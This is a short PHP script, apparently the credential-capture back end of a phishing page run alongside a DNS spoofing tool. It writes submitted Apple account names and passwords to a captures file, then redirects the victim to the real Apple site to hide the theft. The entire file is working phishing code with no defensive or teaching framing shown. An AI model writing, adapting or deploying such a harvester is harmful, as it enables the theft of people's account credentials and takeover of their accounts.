<?php

file_put_contents("/root/rpi_gui_map/DNSSpoof/captures/usernames.txt", "Account: " . $_POST['apple'] . " Pass: " . $_POST['pw'] . "\n", FILE_APPEND);
header('Location: https://www.apple.com');
exit();
